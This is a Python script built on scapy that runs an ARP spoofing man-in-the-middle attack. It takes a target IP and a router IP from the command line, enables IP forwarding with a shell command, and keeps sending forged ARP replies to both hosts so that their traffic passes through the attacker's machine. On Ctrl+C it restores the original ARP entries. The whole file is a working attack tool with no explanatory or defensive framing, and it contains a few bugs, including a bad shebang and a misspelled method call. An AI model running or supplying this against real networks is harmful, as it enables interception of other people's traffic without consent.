#!usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse
import subprocess

def parser_func():
      parser=optparse.OptionParser()
      parser.add_option("-t","--target",dest="target_ip",help="Target IP")
      parser.add_option("-r","--router",dest="router_ip",help="Router IP")
      (values,arguments) = parser.parse_args()
      if not values.target_ip and not values.router_ip :
          parser.error("[-] Enter the target and router IP.\nUse --help for more information")
      elif not values.target_ip:
          parser.errpr("[-] Enter the target IP address.\nUse --help for more information")
      elif not values.router_ip:
          parser.error("[-] Enter the router IP address.\nUse --help for more information")
      else:
          return values

def scan(ip):
   arp_req = scapy.ARP(pdst=ip)
   broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
   packet = broadcast/arp_req 
   answered_list = scapy.srp(packet,timeout=1,verbose=False)[0]  #srp() sends custom ether frames
   return answered_list[0][1].hwsrc


def spoof(ip_victim,ip_spoof):
   mac_victim=scan(ip_victim)
   packet = scapy.ARP(op=2,pdst=ip_victim,hwdst=mac_victim,psrc=ip_spoof) # Default hwsrc is users MAC address
   scapy.send(packet, verbose=False)

def restore(dest_ip,source_ip):
   dest_mac = scan(dest_ip)
   source_mac = scan(source_ip)
   packet = scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=source_ip,hwsrc=source_mac)
   scapy.send(packet,count=4,verbose=False)

arguments = parser_func()
counter = 0
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
try:
 while True:
    spoof(arguments.target_ip,arguments.router_ip)
    spoof(arguments.router_ip,arguments.target_ip)
    counter = counter + 2
    print ("\r[+] Sent Packets:" + str(counter)),  # For python3,add end="" in print() and remove flush()
    sys.stdout.flush()
    time.sleep(2)
except KeyboardInterrupt:
    restore(arguments.target_ip,arguments.router_ip)
    restore(arguments.router_ip,arguments.target_ip)
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward",shell=True)
    print("\n[+] Detected Ctrl + C\n[+] Restoring to Previous State....\n[+] Exiting....")
# echo 1 > /proc/sys/net/ipv4/ip_forward for enablinng request forwarding
